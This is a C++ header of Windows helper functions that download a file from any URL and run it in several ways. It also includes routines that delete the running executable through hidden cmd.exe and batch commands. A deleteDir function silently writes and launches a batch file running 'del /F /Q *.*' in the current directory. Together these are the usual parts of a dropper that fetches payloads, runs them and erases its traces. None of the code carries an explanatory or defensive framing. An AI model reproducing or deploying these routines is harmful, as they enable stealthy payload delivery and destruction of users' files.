#pragma once

#if defined(_WIN32)
	#include <Windows.h>
	#include <Lmcons.h>
	#include <shlobj.h>
#endif

#include <curl/curl.h>

// self delete 3:
#include <strsafe.h>
#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")


std::string getExeFullPath() {
	char filename[MAX_PATH];
	GetModuleFileName(NULL, filename, MAX_PATH);
	return filename;
}

std::string getExeName() {
	char filename[MAX_PATH];
	GetModuleFileName(NULL, filename, MAX_PATH);
	std::string str = filename;
	std::size_t found = str.find_last_of("/\\");
	return str.substr(found + 1);
}

std::string getExeDir() {
	char filename[MAX_PATH];
	GetModuleFileName(NULL, filename, MAX_PATH);
	std::string str = filename;
	std::size_t found = str.find_last_of("/\\");
	return str.substr(0, found);
}

void download(const char outfilename[FILENAME_MAX], const char *url) {

	CURL *curl;
	FILE *fp;
	CURLcode res;

	curl = curl_easy_init();
	if (curl) {
		fp = fopen(outfilename, "wb");
		curl_easy_setopt(curl, CURLOPT_URL, url);
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
		res = curl_easy_perform(curl);
		curl_easy_cleanup(curl);
		fclose(fp);
	}
}

void execute(std::string fileToRun, std::string dir = NULL) {

	// additional information
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	// set the size of the structures
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	// start the program up
	CreateProcess(fileToRun.c_str(),   // the path
		NULL,			// Command line
		NULL,           // Process handle not inheritable
		NULL,           // Thread handle not inheritable
		FALSE,          // Set handle inheritance to FALSE
		0,              // No creation flags
		NULL,           // Use parent's environment block
		dir.c_str(),    // Use parent's starting directory by default(if null)
		&si,            // Pointer to STARTUPINFO structure
		&pi);           // Pointer to PROCESS_INFORMATION structure

		/*
		// Close process and thread handles.
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		*/
}

void execute2(std::string fileToRun, std::string dir = NULL) {
	ShellExecute(NULL, "open", fileToRun.c_str(), NULL, dir.c_str(), SW_SHOW);
}

void execute3(std::string fileToRun) {
	system(fileToRun.c_str());
}

void execute4(std::string fileToRun) {
	std::string command = std::string("start ") + fileToRun;
	system(command.c_str());
}


bool selfDelete() {
	TCHAR szFile[MAX_PATH], szCmd[MAX_PATH];

	if ((GetModuleFileName(0, szFile, MAX_PATH) != 0) &&
		(GetShortPathName(szFile, szFile, MAX_PATH) != 0))
	{
		lstrcpy(szCmd, "/c del ");
		lstrcat(szCmd, szFile);
		lstrcat(szCmd, " >> NUL");

		if ((GetEnvironmentVariable("ComSpec", szFile, MAX_PATH) != 0) &&
			((INT)ShellExecute(0, 0, szFile, szCmd, 0, SW_HIDE)>32))
			return true;
	}

	return true;
}



void selfDelete2() {

	std::string filename = "bat.bat";
	// my app
	char myApp[MAX_PATH];
	GetModuleFileName(0, myApp, MAX_PATH);
	std::string::size_type pos = std::string(myApp).find_last_of("\\");
	std::string myAppFileName = std::string(myApp).substr(pos + 1, std::string(myApp).length());
	// bat
	char dir[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, dir);
	std::string finalDir = std::string(dir) + "\\bat.bat";

	std::ofstream file(filename, std::ios::out);
	if (file.is_open()) {
		file << ":Repeat" << std::endl;
		file << "del " + myAppFileName << std::endl;
		file << "if exist " + myAppFileName + " goto Repeat " << std::endl;
		file << "del ""%0"" ";
		file.close();
	}
	ShellExecute(NULL, "open", finalDir.c_str(), NULL, NULL, SW_HIDE);
}

void selfDelete3() {
	TCHAR szModuleName[MAX_PATH];
	TCHAR szCmd[2 * MAX_PATH];
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	GetModuleFileName(NULL, szModuleName, MAX_PATH);

	StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}



void deleteDir() {
	std::string filename = "bat.bat";
	// my app
	char myApp[MAX_PATH];
	GetModuleFileName(0, myApp, MAX_PATH);
	std::string::size_type pos = std::string(myApp).find_last_of("\\");
	std::string myAppFileName = std::string(myApp).substr(pos + 1, std::string(myApp).length());
	// bat
	char dir[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, dir);
	std::string finalDir = std::string(dir) + "\\bat.bat";

	std::ofstream file(filename, std::ios::out);
	if (file.is_open()) {
		file << ":Repeat" << std::endl;
		file << "del /F /Q *.*" << std::endl;
		file << "del ""%0"" ";
		file.close();
	}
	ShellExecute(NULL, "open", finalDir.c_str(), NULL, NULL, SW_HIDE);
}


std::string getFileNameFromPath(std::string path) {
	int no_of_backslash = (int)count(path.begin(), path.end(), '\\');
	if (no_of_backslash == 0) {
		std::size_t found = path.find_last_of("/\\");
		return path.substr(found + 1);
	} else {
		std::size_t found = path.find_last_of("\\");
		return path.substr(found + 1);
	}
}